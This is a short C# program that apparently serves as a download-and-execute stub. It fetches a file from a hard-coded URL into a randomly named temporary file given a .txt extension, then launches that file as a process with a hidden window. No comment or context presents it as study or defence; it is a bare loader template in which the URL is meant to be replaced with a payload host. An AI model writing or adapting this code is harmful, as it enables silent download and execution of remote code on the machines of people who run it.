using System;
using System.Diagnostics;
using System.IO;
using System.Net;

namespace DUC;

internal class Program
{
	public static string URL = "https://vk.com";

	private static void Main(string[] args)
	{
		string file = FileName();
		Download(file, URL);
		Start(file);
	}

	private static void Start(string file)
	{
		Process process = new Process
		{
			StartInfo = 
			{
				FileName = file + ".txt",
				WindowStyle = ProcessWindowStyle.Hidden
			}
		};
		process.Start();
	}

	private static void Download(string file, string url)
	{
		new WebClient().DownloadFile(new Uri(url), file + ".txt");
	}

	private static string FileName()
	{
		return Path.GetTempPath() + Path.GetRandomFileName();
	}
}
